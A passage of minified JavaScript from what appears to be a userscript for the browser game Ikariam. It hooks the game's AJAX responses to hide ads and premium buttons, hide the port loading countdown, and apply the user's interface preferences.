e=this;e.originalParseResponse=unsafeWindow.ajax.Responder.parseResponse;unsafeWindow.ajax.Responder.parseResponse=function(t){e.ajaxResponse=e.prepareResponce(t);e.analizeResponse();if(e.hasUpdateGlobalData())if(IPK.Preferences.get("hideAdsBanners")){e.ajaxResponse[e.updateGlobalDataIndex][1][5]="";IPK.Preferences.apply("hideAdsBanners")}if(e.hasChangeView()){e.filterChangeView()}else{e.filterUpdateTemplateDataForMilitaryAdvisor();e.filterUpdateTemplateDataForBarracks()}e.originalParseResponse.call(this,JSON.stringify(e.ajaxResponse))};unsafeWindow.ikariam.Controller.ajaxResponder=unsafeWindow.ajax.Responder;if(IPK.Preferences.get("disablePortLoadingTime")&&typeof unsafeWindow.city!=="undefined"&&unsafeWindow.city){GM_addStyle("#city #locations .building .timetofinish.portSpeedup { display: none }");e.originalShowPortLoadingCountdown=unsafeWindow.city.Screen.showPortLoadingCountdown;unsafeWindow.city.Screen.showPortLoadingCountdown=function(){return}}},prepareResponce:function(e){if(typeof e==="string")return JSON.parse(e);else return e},analizeResponse:function(){this.changeViewIndex=-1;this.updateGlobalDataIndex=-1;this.updateTemplateDataIndex=-1;this.changeViewId=null;this.changeViewContent=null;for(var e=0;e<this.ajaxResponse.length;e++){if(this.ajaxResponse[e][0]=="changeView"){this.changeViewIndex=e;this.changeViewId=this.ajaxResponse[this.changeViewIndex][1][0];this.changeViewContent=this.ajaxResponse[this.changeViewIndex][1][1]}else if(this.ajaxResponse[e][0]=="updateGlobalData"){this.updateGlobalDataIndex=e}else if(this.ajaxResponse[e][0]=="updateTemplateData"){this.updateTemplateDataIndex=e}}},commentScripts:function(e){e=e.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi,function(){return"<!--"+arguments[0]+"-->"});return e},fixFormSelfClosingTagBug:function(e){e=e.replace(/(<form.*?)(\/>)/gi,"$1>");return e},hasChangeView:function(){return this.changeViewIndex>-1},hasUpdateGlobalData:function(){return this.updateGlobalDataIndex>-1},filterChangeView:function(){if(this.changeViewIndex>-1){this.changeViewContent=this.fixFormSelfClosingTagBug(this.changeViewContent);this.changeViewContent=this.commentScripts(this.changeViewContent);this.changeViewContent=$("<div/>").append($(this.changeViewContent));IPK.ForceFixes.applyAjax(this.changeViewContent);if(IPK.Preferences.exists(this.changeViewId))IPK.Preferences.apply(this.changeViewId,this.changeViewContent);else if(IPK.PseudoFixes.exists(this.changeViewId))IPK.PseudoFixes.apply(this.changeViewId,this.changeViewContent);this.applyChangeView()}},filterUpdateTemplateDataForMilitaryAdvisor:function(){if(this.updateTemplateDataIndex>-1&&typeof this.ajaxResponse[this.updateTemplateDataIndex][1]["js_MilitaryMovementsFleetMovementsTable"]!=="undefined"){var e=this,t=this.ajaxResponse[this.updateTemplateDataIndex][1]["js_MilitaryMovementsFleetMovementsTable"],n;t=this.commentScripts(t);n=$("<div/>").append($(t));$("table.table01 tr",n).each(function(e){$(this).children().eq(2).hide()});this.ajaxResponse[this.updateTemplateDataIndex][1]["js_MilitaryMovementsFleetMovementsTable"]=n.html();$.each(this.ajaxResponse[this.updateTemplateDataIndex][1],function(t,n){var r=t.match(/js_MilitaryMovementsEventRow(\d+)PremiumLink/);if(r!==null){try{if(n.class=="button"){n.class="invisible";var i="js_MilitaryMovementsEventRow{0}UnitDetails".format(r[1]);e.ajaxResponse[e.updateTemplateDataIndex][1][i]=""}}catch(s){}}})}},filterUpdateTemplateDataForBarracks:function(){if(this.updateTemplateDataIndex>-1){$.each(this.ajaxResponse[this.updateTemplateDataIndex][1],function(e,t){if(e.replace(/\d+$/g,"")=="js_barracksProblemTextfield"){try{t.text=t.text.stripLinks()}catch(n){}}})}},applyChangeView:function(){this.ajaxResponse[this.changeViewIndex][1][1]=this.changeViewContent.html()}};IPK.Init=function(){IPK.Language.selectLanguage();IPK.Preferences.loadSettings();IPK.IkaView=$.getUrlVar("view",$("body").attr("id"));IPK.IkaFunction=$.getUrlVar("function");IPK.NoAction=!$.urlVarExists("action");IPK.IsLoginScreen=$("#loginWrapper").exists();IPK.IsIkariam=IPK.IkaView.length>0||IPK.IsLoginScreen;IPK.IsRTL=/rtl/i.test($("body").css("direction"))};IPK.Run=function(){if(!IPK.IsLoginScreen){IPK.Ajax.hook();if(IPK.IkaView=="island")IPK.Island.hook();IPK.ForceFixes.applyAll();IPK.Preferences.apply("happyHour");IPK.Preferences.apply("facebookIcon");IPK.Preferences.apply("tbPlus");IPK.Preferences.apply("viewPremiumAdvisors");IPK.Preferences.apply("pirateShipsButton");IPK.Preferences.apply("hideFriendsSidebar");IPK.Preferences.apply("hideFooterBar");if(IPK.Preferences.get("hideAmbrosiaFancyIcon"))IPK.Preferences.apply("hideAmbrosiaFancyIcon");else if(IPK.Preferences.get("changeAmbrosiaFancyIcon"))IPK.Preferences.apply("changeAmbrosiaFancyIcon");IPK.Preferences.apply("advPlusTeaser");IPK.Preferences.apply("sideButtonPremiumTrader");IPK.Preferences.apply("sideButtonDummyPackages");IPK.Preferences.apply("sideButtonFriendListEdit");IPK.Preferences.apply("buldingSpeedupButton");IPK.Preferences.apply("hideBuildingDescription");IPK.Preferences.apply("hilightInboxCitySubjectLinks")}else{IPK.Preferences.apply("changeLoginScreen")}};IPK.Init();if(IPK.IsIkariam){IPK.Run();IPK.SetupUI()}